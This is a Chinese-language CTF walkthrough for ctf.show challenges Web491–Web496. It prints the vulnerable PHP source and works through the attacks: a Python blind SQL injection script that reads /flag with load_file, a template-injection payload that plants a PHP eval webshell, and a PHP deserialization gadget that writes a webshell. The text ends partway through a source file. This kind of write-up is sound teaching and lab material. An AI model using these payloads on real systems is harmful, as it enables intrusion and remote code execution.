+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718122139154.png&#34; alt=&#34;image-20230718122139154&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web491&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web491&#34;&gt;#&lt;/a&gt; Web491&lt;/h2&gt;
+&lt;p&gt;还是读文件&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
+&amp;lt;?php
+include(&#39;render/render_class.php&#39;);
+include(&#39;render/db_class.php&#39;);
+$action=$_GET[&#39;action&#39;];
+if(!isset($action))&amp;#123;
+	header(&#39;location:index.php?action=login&#39;);
+	die();	
+&amp;#125;
+if($action==&#39;check&#39;)&amp;#123;
+	extract($_GET);
+	$sql = &amp;quot;select username from user where username = &#39;&amp;quot;.$username.&amp;quot;&#39; and password=&#39;&amp;quot;.md5($password).&amp;quot;&#39; order by id limit 1&amp;quot;;
+	$user=db::select_one($sql);
+	if($user)&amp;#123;
+		templateUtil::render(&#39;index&#39;);
+	&amp;#125;else&amp;#123;
+		templateUtil::render(&#39;error&#39;);
+	&amp;#125;
+&amp;#125;
+if($action==&#39;clear&#39;)&amp;#123;
+	system(&#39;rm -rf cache/*&#39;);
+	die(&#39;cache clear&#39;);
+&amp;#125;
+if($action==&#39;login&#39;)&amp;#123;
+	templateUtil::render($action);
+&amp;#125;else&amp;#123;
+	templateUtil::render($action);
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里直接利用文件读取，拿到 flag，注入成功是这样的&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718123312548.png&#34; alt=&#34;image-20230718123312548&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;脚本贴一下&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import requests
+import time
+
+flag = &#39;&#39;
+
+for i in range(1,250):
+    time.sleep(0.04)
+    low = 32
+    high = 128
+    mid = (low+high)//2
+    while(low&amp;lt;high):
+        payload = &amp;quot;http://1a92c0ba-d724-444d-a2c4-430a7e61ed59.challenge.ctf.show/index.php?action=check&amp;amp;username=admin&#39; or ascii(substr((select load_file(&#39;/flag&#39;)),&amp;#123;0&amp;#125;,1))&amp;gt;&amp;#123;1&amp;#125;--+&amp;amp;password=1&amp;quot;.format(i,mid)
+        r = requests.get(payload)#get方法传数据
+        # print(payload)
+        # time.sleep(0.04)
+        if &#39;flag&#39; in r.text:#二分法
+            low = mid+1
+        else:
+            high = mid
+        mid = (low+high)//2
+    if(mid ==32 or mid ==127):
+        break
+    flag = flag+chr(mid)
+    print(flag)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718145235805.png&#34; alt=&#34;image-20230718145235805&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web492&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web492&#34;&gt;#&lt;/a&gt; Web492&lt;/h2&gt;
+&lt;p&gt;读文件还能用，这里还是先读文件&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
+&amp;lt;?php
+
+include(&#39;render/render_class.php&#39;);
+include(&#39;render/db_class.php&#39;);
+
+
+$action=$_GET[&#39;action&#39;];
+if(!isset($action))&amp;#123;
+	header(&#39;location:index.php?action=login&#39;);
+	die();	
+&amp;#125;
+
+if($action==&#39;check&#39;)&amp;#123;
+	extract($_GET);
+	if(preg_match(&#39;/^[A-Za-z0-9]+$/&#39;, $username))&amp;#123;
+		$sql = &amp;quot;select username from user where username = &#39;&amp;quot;.$username.&amp;quot;&#39; and password=&#39;&amp;quot;.md5($password).&amp;quot;&#39; order by id limit 1&amp;quot;;
+		$user=db::select_one_array($sql);
+	&amp;#125;
+	if($user)&amp;#123;
+		templateUtil::render(&#39;index&#39;,$user);
+	&amp;#125;else&amp;#123;
+		templateUtil::render(&#39;error&#39;);
+	&amp;#125;
+&amp;#125;
+if($action==&#39;clear&#39;)&amp;#123;
+	system(&#39;rm -rf cache/*&#39;);
+	die(&#39;cache clear&#39;);
+&amp;#125;
+
+if($action==&#39;login&#39;)&amp;#123;
+	templateUtil::render($action);
+&amp;#125;else&amp;#123;
+	templateUtil::render($action);
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里比起上一题改变不多，这里调用 templateUtil 的 render 函数有第二个参数的是当 User 有值的时候调用，这里简单的变量覆盖就可以了&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;?action=check&amp;amp;user[username]=&amp;lt;?php eval($_POST[&amp;quot;a&amp;quot;]); ?&amp;gt;--+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718195121050.png&#34; alt=&#34;image-20230718195121050&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里会在前后加上注释，对应代码块&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+include(&#39;file_class.php&#39;);
+include(&#39;cache_class.php&#39;);
+
+class templateUtil &amp;#123;
+	public static function render($template,$arg=array())&amp;#123;
+		if(cache::cache_exists($template))&amp;#123;
+			echo cache::get_cache($template);
+		&amp;#125;else&amp;#123;
+			$templateContent=fileUtil::read(&#39;templates/&#39;.$template.&#39;.php&#39;);
+			$cache=templateUtil::shade($templateContent,$arg);
+			cache::create_cache($template,$cache);
+			echo $cache;
+		&amp;#125;
+	&amp;#125;
+	public static  function shade($templateContent,$arg)&amp;#123;
+		foreach ($arg as $key =&amp;gt; $value) &amp;#123;
+			$templateContent=str_replace(&#39;&amp;#123;&amp;#123;&#39;.$key.&#39;&amp;#125;&amp;#125;&#39;, &#39;&amp;lt;！--&#39;.$value.&#39;--&amp;gt;&#39;, $templateContent);
+		&amp;#125;
+		return $templateContent;
+	&amp;#125;
+
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;?action=check&amp;amp;user[username]=--&amp;gt;&amp;lt;?php eval($_POST[&amp;quot;a&amp;quot;]); ?&amp;gt;--+&amp;lt;--
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718195357162.png&#34; alt=&#34;image-20230718195357162&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web493&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web493&#34;&gt;#&lt;/a&gt; Web493&lt;/h2&gt;
+&lt;p&gt;还是先读文件，index.php&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
+&amp;lt;?php
+session_start();
+include(&#39;render/render_class.php&#39;);
+include(&#39;render/db_class.php&#39;);
+$action=$_GET[&#39;action&#39;];
+if(!isset($action))&amp;#123;
+	if(isset($_COOKIE[&#39;user&#39;]))&amp;#123;
+		$c=$_COOKIE[&#39;user&#39;];
+		$user=unserialize($c);
+		if($user)&amp;#123;
+			templateUtil::render(&#39;index&#39;);
+		&amp;#125;else&amp;#123;
+			header(&#39;location:index.php?action=login&#39;);
+		&amp;#125;
+	&amp;#125;else&amp;#123;
+		header(&#39;location:index.php?action=login&#39;);
+	&amp;#125;
+	die();	
+&amp;#125;
+
+if($action==&#39;check&#39;)&amp;#123;
+	extract($_GET);
+	if(preg_match(&#39;/^[A-Za-z0-9]+$/&#39;, $username))&amp;#123;
+		$sql = &amp;quot;select username from user where username = &#39;&amp;quot;.$username.&amp;quot;&#39; and password=&#39;&amp;quot;.md5($password).&amp;quot;&#39; order by id limit 1&amp;quot;;
+		$db=new db();
+		$user=$db-&amp;gt;select_one($sql);
+	&amp;#125;
+	if($user)&amp;#123;
+		setcookie(&#39;user&#39;,$user);
+		templateUtil::render(&#39;index&#39;);
+	&amp;#125;else&amp;#123;
+		templateUtil::render(&#39;error&#39;);
+	&amp;#125;
+&amp;#125;
+if($action==&#39;clear&#39;)&amp;#123;
+	system(&#39;rm -rf cache/*&#39;);
+	die(&#39;cache clear&#39;);
+&amp;#125;
+
+if($action==&#39;login&#39;)&amp;#123;
+	templateUtil::render($action);
+&amp;#125;else&amp;#123;
+	templateUtil::render($action);
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;render_class.php&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+include(&#39;file_class.php&#39;);
+include(&#39;cache_class.php&#39;);
+class templateUtil &amp;#123;
+	public static function render($template,$arg=array())&amp;#123;
+		if(cache::cache_exists($template))&amp;#123;
+			echo cache::get_cache($template);
+		&amp;#125;else&amp;#123;
+			$templateContent=fileUtil::read(&#39;templates/&#39;.$template.&#39;.php&#39;);
+			$cache=templateUtil::shade($templateContent,$arg);
+			cache::create_cache($template,$cache);
+			echo $cache;
+		&amp;#125;
+	&amp;#125;
+	public static  function shade($templateContent,$arg=array())&amp;#123;
+		foreach ($arg as $key =&amp;gt; $value) &amp;#123;
+			$templateContent=str_replace(&#39;&amp;#123;&amp;#123;&#39;.$key.&#39;&amp;#125;&amp;#125;&#39;, &#39;&amp;lt;！--&#39;.$value.&#39;--&amp;gt;&#39;, $templateContent);
+		&amp;#125;
+		return $templateContent;
+	&amp;#125;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;file_class.php&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+error_reporting(0);
+class fileUtil&amp;#123;
+
+	public static function read($filename)&amp;#123;
+		return file_get_contents($filename);
+	&amp;#125;
+
+	public static function write($filename,$content,$append =0)&amp;#123;
+		if($append)&amp;#123;
+			file_put_contents($filename, $content,FILE_APPEND);
+		&amp;#125;else&amp;#123;
+			file_put_contents($filename, $content);
+		 &amp;#125;
+	&amp;#125;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;cache_class.php&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+class cache&amp;#123;
+	public static function create_cache($template,$content)&amp;#123;
+		if(file_exists(&#39;cache/&#39;.md5($template).&#39;.php&#39;))&amp;#123;
+			return true;
+		&amp;#125;else&amp;#123;
+			fileUtil::write(&#39;cache/&#39;.md5($template).&#39;.php&#39;,$content);
+		&amp;#125;
+	&amp;#125;
+	public static function get_cache($template)&amp;#123;
+		return fileUtil::read(&#39;cache/&#39;.md5($template).&#39;.php&#39;);
+	&amp;#125;
+	public static function cache_exists($template)&amp;#123;
+		return file_exists(&#39;cache/&#39;.md5($template).&#39;.php&#39;);
+	&amp;#125;
+
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;render/db_class.php&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+error_reporting(0);
+class db&amp;#123;
+	
+	public $db;
+	public $log;
+	public $sql;
+	public $username=&#39;root&#39;;
+	public $password=&#39;root&#39;;
+	public $port=&#39;3306&#39;;
+	public $addr=&#39;127.0.0.1&#39;;
+	public $database=&#39;ctfshow&#39;;
+	public function __construct()&amp;#123;
+		$this-&amp;gt;log=new dbLog();
+		$this-&amp;gt;db=$this-&amp;gt;getConnection();
+	&amp;#125;
+
+	public function getConnection()&amp;#123;
+		 
+		return new mysqli($this-&amp;gt;addr,$this-&amp;gt;username,$this-&amp;gt;password,$this-&amp;gt;database);
+	&amp;#125;
+
+	public  function select_one($sql)&amp;#123;
+		$this-&amp;gt;sql=$sql;
+		$conn = db::getConnection();
+		$result=$conn-&amp;gt;query($sql);
+		if($result)&amp;#123;
+			return $result-&amp;gt;fetch_object();
+		&amp;#125;
+
+	&amp;#125;
+	public  function select_one_array($sql)&amp;#123;
+		$this-&amp;gt;sql=$sql;
+		$conn = db::getConnection();
+		$result=$conn-&amp;gt;query($sql);
+		if($result)&amp;#123;
+			return $result-&amp;gt;fetch_assoc();
+		&amp;#125;
+
+	&amp;#125;
+	public function __destruct()&amp;#123;
+		$this-&amp;gt;log-&amp;gt;log($this-&amp;gt;sql);
+	&amp;#125;
+&amp;#125;
+class dbLog&amp;#123;
+	public $sql;
+	public $content;
+	public $log;
+
+	public function __construct()&amp;#123;
+		$this-&amp;gt;log=&#39;log/&#39;.date_format(date_create(),&amp;quot;Y-m-d&amp;quot;).&#39;.txt&#39;;
+	&amp;#125;
+	public function log($sql)&amp;#123;
+		$this-&amp;gt;content = $this-&amp;gt;content.date_format(date_create(),&amp;quot;Y-m-d-H-i-s&amp;quot;).&#39; &#39;.$sql.&#39; \r\n&#39;;
+	&amp;#125;
+	public function __destruct()&amp;#123;
+		file_put_contents($this-&amp;gt;log, $this-&amp;gt;content,FILE_APPEND);
+	&amp;#125;
+&amp;#125;
+
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;在 index 代码中有一个反序列化函数，可以覆盖 dblog 调用 destruct 中的 file_put_contents 函数来写马&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+
+class dblog&amp;#123;
+    public $content=&#39;&amp;lt;?php @eval($_POST[a]);?&amp;gt;&#39;;
+    public $log=&amp;quot;1.php&amp;quot;;
+
+    public function __destruct()&amp;#123;
+        file_put_contents($this-&amp;gt;content,$this-&amp;gt;log);
+    &amp;#125;
+&amp;#125;
+echo urlencode(serialize(new dblog()));
+unlink(&amp;quot;1.php&amp;quot;);
+//O%3A5%3A%22dblog%22%3A2%3A%7Bs%3A7%3A%22content%22%3Bs%3A25%3A%22%3C%3Fphp+%40eval%28%24_POST%5Ba%5D%29%3B%3F%3E%22%3Bs%3A3%3A%22log%22%3Bs%3A5%3A%221.php%22%3B%7D
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719195253333.png&#34; alt=&#34;image-20230719195253333&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;调用完成后去连接&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719195235259.png&#34; alt=&#34;image-20230719195235259&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web494&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web494&#34;&gt;#&lt;/a&gt; Web494&lt;/h2&gt;
+&lt;p&gt;先读文件&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;../index
+../render/render_class
+../render/file_class
+../render/cache_class
+../render/db_class
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;index.php&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+session_start();
+include(&#39;render/render_class.php&#39;);
+include(&#39;render/db_class.php&#39;);
+
+
+$action=$_GET[&#39;action&#39;];
+if(!isset($action))&amp;#123;
+	if(isset($_COOKIE[&#39;user&#39;]))&amp;#123;
+		$c=$_COOKIE[&#39;user&#39;];
+		if(preg_match(&#39;/\:|\,/&#39;, $c))&amp;#123;
+			$user=unserialize($c);
+		&amp;#125;
+		if($user)&amp;#123;
+			templateUtil::render(&#39;index&#39;);
+		&amp;#125;else&amp;#123;
+			header(&#39;location:index.php?action=login&#39;);
+		&amp;#125;
+	&amp;#125;else&amp;#123;
+		header(&#39;location:index.php?action=login&#39;);
+	&amp;#125;
+	die();	
+&amp;#125;
+
+if($action==&#39;check&#39;)&amp;#123;
+	extract($_GET);
+	if(!preg_match(&#39;/or|and|innodb|sys/i&#39;, $username))&amp;#123;
+		$sql = &amp;quot;select username from user where username = &#39;&amp;quot;.$username.&amp;quot;&#39; and password=&#39;&amp;quot;.md5($password).&amp;quot;&#39; order by id limit 1&amp;quot;;
+		$db=new db();
+		$user=$db-&amp;gt;select_one_array($sql);
+	&amp;#125;
+	if($user)&amp;#123;
+		setcookie(&#39;user&#39;,$user);
+		templateUtil::render(&#39;index&#39;,$user);
+	&amp;#125;else&amp;#123;
+		templateUtil::render(&#39;error&#39;);
+	&amp;#125;
+&amp;#125;
+if($action==&#39;clear&#39;)&amp;#123;
+	system(&#39;rm -rf cache/*&#39;);
+	die(&#39;cache clear&#39;);
+&amp;#125;
+
+if($action==&#39;login&#39;)&amp;#123;
+	templateUtil::render($action);
+&amp;#125;else&amp;#123;
+	templateUtil::render($action);
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;../render/render_class&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
+&amp;lt;?php
+include(&#39;file_class.php&#39;);
+include(&#39;cache_class.php&#39;);
+
+class templateUtil &amp;#123;
+	public static function render($template,$arg=array())&amp;#123;
+		if(cache::cache_exists($template))&amp;#123;
+			echo cache::get_cache($template);
+		&amp;#125;else&amp;#123;
+			$templateContent=fileUtil::read(&#39;templates/&#39;.$template.&#39;.php&#39;);
+			$cache=templateUtil::shade($templateContent,$arg);
+			cache::create_cache($template,$cache);
+			echo $cache;
+		&amp;#125;
+	&amp;#125;
+	public static  function shade($templateContent,$arg=array())&amp;#123;
+		foreach ($arg as $key =&amp;gt; $value) &amp;#123;
+			$templateContent=str_replace(&#39;&amp;#123;&amp;#123;&#39;.$key.&#39;&amp;#125;&amp;#125;&#39;, $value, $templateContent);
+		&amp;#125;
+		return $templateContent;
+	&amp;#125;
+
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;../render/file_class&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+error_reporting(0);
+class fileUtil&amp;#123;
+
+	public static function read($filename)&amp;#123;
+		return file_get_contents($filename);
+	&amp;#125;
+
+	public static function write($filename,$content,$append =0)&amp;#123;
+		if($append)&amp;#123;
+			file_put_contents($filename, $content,FILE_APPEND);
+		&amp;#125;else&amp;#123;
+			file_put_contents($filename, $content);
+		&amp;#125;
+	&amp;#125;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;../render/cache_class&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+
+class cache&amp;#123;
+	public static function create_cache($template,$content)&amp;#123;
+		if(file_exists(&#39;cache/&#39;.md5($template).&#39;.html&#39;))&amp;#123;
+			return true;
+		&amp;#125;else&amp;#123;
+			fileUtil::write(&#39;cache/&#39;.md5($template).&#39;.html&#39;,$content);
+		&amp;#125;
+	&amp;#125;
+	public static function get_cache($template)&amp;#123;
+		return fileUtil::read(&#39;cache/&#39;.md5($template).&#39;.html&#39;);
+	&amp;#125;
+	public static function cache_exists($template)&amp;#123;
+		return file_exists(&#39;cache/&#39;.md5($template).&#39;.html&#39;);
+	&amp;#125;
+
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;../render/db_class&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
+&amp;lt;?php
+error_reporting(0);
+class db&amp;#123;
+	
+	public $db;
+	public $log;
+	public $sql;
+	public $username=&#39;root&#39;;
+	public $password=&#39;root&#39;;
+	public $port=&#39;3306&#39;;
+	public $addr=&#39;127.0.0.1&#39;;
+	public $database=&#39;ctfshow&#39;;
+	public function __construct()&amp;#123;
+		$this-&amp;gt;log=new dbLog();
+		$this-&amp;gt;db=$this-&amp;gt;getConnection();
+	&amp;#125;
+
+	public function getConnection()&amp;#123;
+		 
+		return new mysqli($this-&amp;gt;addr,$this-&amp;gt;username,$this-&amp;gt;password,$this-&amp;gt;database);
+	&amp;#125;
+
+	public  function select_one($sql)&amp;#123;
+		$this-&amp;gt;sql=$sql;
+		$conn = db::getConnection();
+		$result=$conn-&amp;gt;query($sql);
+		if($result)&amp;#123;
+			return $result-&amp;gt;fetch_object();
+		&amp;#125;
+
+	&amp;#125;
+	public  function select_one_array($sql)&amp;#123;
+		$this-&amp;gt;sql=$sql;
+		$conn = db::getConnection();
+		$result=$conn-&amp;gt;query($sql);
+		if($result)&amp;#123;
+			return $result-&amp;gt;fetch_assoc();
+		&amp;#125;
+
+	&amp;#125;
+	public function __destruct()&amp;#123;
+		$this-&amp;gt;log-&amp;gt;log($this-&amp;gt;sql);
+	&amp;#125;
+&amp;#125;
+class dbLog&amp;#123;
+	public $sql;
+	public $content;
+	public $log;
+
+	public function __construct()&amp;#123;
+		$this-&amp;gt;log=&#39;log/&#39;.date_format(date_create(),&amp;quot;Y-m-d&amp;quot;).&#39;.txt&#39;;
+	&amp;#125;
+	public function log($sql)&amp;#123;
+		$this-&amp;gt;content = $this-&amp;gt;content.date_format(date_create(),&amp;quot;Y-m-d-H-i-s&amp;quot;).&#39; &#39;.$sql.&#39; \r\n&#39;;
+	&amp;#125;
+	public function __destruct()&amp;#123;
+		file_put_contents($this-&amp;gt;log, $this-&amp;gt;content,FILE_APPEND);
+	&amp;#125;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;比起上一题，这里在反序列化内容这里加了一些判断，但是不影响做题流程，还是用上一题的 payload&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+
+class dblog&amp;#123;
+    public $content=&#39;&amp;lt;?php @eval($_POST[a]);?&amp;gt;&#39;;
+    public $log=&amp;quot;1.php&amp;quot;;
+
+    public function __destruct()&amp;#123;
+        file_put_contents($this-&amp;gt;content,$this-&amp;gt;log);
+    &amp;#125;
+&amp;#125;
+echo urlencode(serialize(new dblog()));
+unlink(&amp;quot;1.php&amp;quot;);
+//O%3A5%3A%22dblog%22%3A2%3A%7Bs%3A7%3A%22content%22%3Bs%3A25%3A%22%3C%3Fphp+%40eval%28%24_POST%5Ba%5D%29%3B%3F%3E%22%3Bs%3A3%3A%22log%22%3Bs%3A5%3A%221.php%22%3B%7D
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719200625732.png&#34; alt=&#34;image-20230719200625732&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;但是这这个 flag 是空的&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719200713133.png&#34; alt=&#34;image-20230719200713133&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;但是这里有数据库的登录用户密码，所以这里可以使用蚁剑的模块来登录数据库&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719200937411.png&#34; alt=&#34;image-20230719200937411&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web496&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web496&#34;&gt;#&lt;/a&gt; Web496&lt;/h2&gt;
+&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;../index
+../render/render_class
+../render/file_class
+../render/cache_class
+../render/db_class
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;../index&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
+&amp;lt;?php
+session_start();
+include(&#39;render/render_class.php&#39;);
+include(&#39;render/db_class.php&#39;);
+
+
+$action=$_GET[&#39;action&#39;];
+
+
+if(!isset($action))&amp;#123;
+	if(isset($_COOKIE[&#39;user&#39;]))&amp;#123;
+		$c=$_COOKIE[&#39;user&#39;];
+		if(preg_match(&#39;/\:|\,/&#39;, $c))&amp;#123;
+			#$user=unserialize($c);
+		&amp;#125;
+		if($user)&amp;#123;
+			templateUtil::render(&#39;index&#39;);
+		&amp;#125;else&amp;#123;
+			header(&#39;location:index.php?action=login&#39;);
+		&amp;#125;
+	&amp;#125;else&amp;#123;
+		header(&#39;location:index.php?action=login&#39;);
+	&amp;#125;
+	die();	
+&amp;#125;
+
+switch ($action) &amp;#123;
+	case &#39;check&#39;:
+		$username=$_POST[&#39;username&#39;];
+		$password=$_POST[&#39;password&#39;];
+		if(!preg_match(&#39;/or|file|innodb|sys|mysql/i&#39;, $username))&amp;#123;
+			$sql = &amp;quot;select username,nickname from user where username = &#39;&amp;quot;.$username.&amp;quot;&#39; and password=&#39;&amp;quot;.md5($password).&amp;quot;&#39; order by id limit 1&amp;quot;;
+			$db=new db();
+			$user=$db-&amp;gt;select_one_array($sql);
+		&amp;#125;
+		if($user)&amp;#123;
+			$_SESSION[&#39;user&#39;]=$user;
+			header(&#39;location:index.php?action=index&#39;);
+		&amp;#125;else&amp;#123;
+			templateUtil::render(&#39;error&#39;);
+		&amp;#125;
+		break;
+	case &#39;clear&#39;:
+		system(&#39;rm -rf cache/*&#39;);
+		die(&#39;cache clear&#39;);
+		break;
+	case &#39;login&#39;:
+		templateUtil::render($action);
+		break;
+	case &#39;index&#39;:
+		$user=$_SESSION[&#39;user&#39;];
+		if($user)&amp;#123;
+			templateUtil::render(&#39;index&#39;,$user);
+		&amp;#125;else&amp;#123;
+			header(&#39;location:index.php?action=login&#39;);
+		&amp;#125;
+		break;
+	case &#39;view&#39;:
+		$user=$_SESSION[&#39;user&#39;];
+		if($user)&amp;#123;
+			templateUtil::render($_GET[&#39;page&#39;],$user);
+		&amp;#125;else&amp;#123;
+			header(&#39;location:index.php?action=login&#39;);
+		&amp;#125;
+		break;
+	case &#39;logout&#39;:
+		session_destroy();
+		header(&#39;location:index.php?action=login&#39;);
+		break;
+	default:
+		templateUtil::render($action);
+		break;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;../render/render_class&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+
+include(&#39;file_class.php&#39;);
+include(&#39;cache_class.php&#39;);
+
+class templateUtil &amp;#123;
+	public static function render($template,$arg=array())&amp;#123;
+		$templateContent=fileUtil::read(&#39;templates/&#39;.$template.&#39;.php&#39;);
+		$cache=templateUtil::shade($templateContent,$arg);
+		echo $cache;
+	&amp;#125;
+	public static  function shade($templateContent,$arg=array())&amp;#123;
+		foreach ($arg as $key =&amp;gt; $value) &amp;#123;
+			$templateContent=str_replace(&#39;&amp;#123;&amp;#123;&#39;.$key.&#39;&amp;#125;&amp;#125;&#39;, $value, $templateContent);
+		&amp;#125;
+		return $templateContent;
+	&amp;#125;
+
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;../render/file_class&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
+&amp;lt;?php
+error_reporting(0);
+class fileUtil&amp;#123;
+
+	public static function read($filename)&amp;#123;
+		return file_get_contents($filename);
+	&amp;#125;
+
+	public static function write($filename,$content,$append =0)&amp;#123;
+		if($append)&amp;#123;
+			file_put_contents($filename, $content,FILE_APPEND);
+		&amp;#125;else&amp;#123;
+			file_put_contents($filename, $content);
+		&amp;#125;
+	&amp;#125;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;../render/cache_class&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
+&amp;lt;?php
+class cache&amp;#123;
+	public static function create_cache($template,$content)&amp;#123;
+		if(file_exists(&#39;cache/&#39;.md5($template).&#39;.html&#39;))&amp;#123;
+			return true;
+		&amp;#125;else&amp;#123;
+			fileUtil::write(&#39;cache/&#39;.md5($template).&#39;.html&#39;,$content);
+		&amp;#125;
+	&amp;#125;
+	public static function get_cache($template)&amp;#123;
+		return fileUtil::read(&#39;cache/&#39;.md5($template).&#39;.html&#39;);
+	&amp;#125;
+	public static function cache_exists($template)&amp;#123;
+		return file_exists(&#39;cache/&#39;.md5($template).&#39;.html&#39;);
+	&amp;#125;
+
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;../render/db_class&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
+&amp;lt;?php
+error_reporting(0);
+class db&amp;#123;
+	
+	public $db;
+	public $log;
+	public $sql;
+	public $username=&#39;root&#39;;
+	public $password=&#39;root&#39;;
+	public $port=&#39;3306&#39;;
+	public $addr=&#39;127.0.0.1&#39;;
+	public $database=&#39;ctfshow&#39;;
+	public function __construct()&amp;#123;
+		$this-&amp;gt;log=new dbLog();
+		$this-&amp;gt;db=$this-&amp;gt;getConnection();
+	&amp;#125;
+
+	public function getConnection()&amp;#123;
+		 
+		return new mysqli($this-&amp;gt;addr,$this-&amp;gt;username,$this-&amp;gt;password,$this-&amp;gt;database);
+	&amp;#125;
+
+	public  function select_one($sql)&amp;#123;
+		$this-&amp;gt;sql=$sql;
+		$result=$this-&amp;gt;db-&amp;gt;query($sql);
+		if($result)&amp;#123;
+			return $result-&amp;gt;fetch_object();
+		&amp;#125;
+
+	&amp;#125;
+	public  function select_one_array($sql)&amp;#123;
+		$this-&amp;gt;sql=$sql;
+		$conn = db::getConnection();
+		$result=$this-&amp;gt;db-&amp;gt;query($sql);
+		if($result)&amp;#123;
+			return $result-&amp;gt;fetch_assoc();
+		&amp;#125;
+	&amp;#125;
+	public function update_one($sql)&amp;#123;
+		$this-&amp;gt;sql=$sql;
+		$conn = db::getConnection();
+		$this-&amp;gt;db-&amp;gt;query($sql);
+		return $this-&amp;gt;db-&amp;gt;affected_rows;
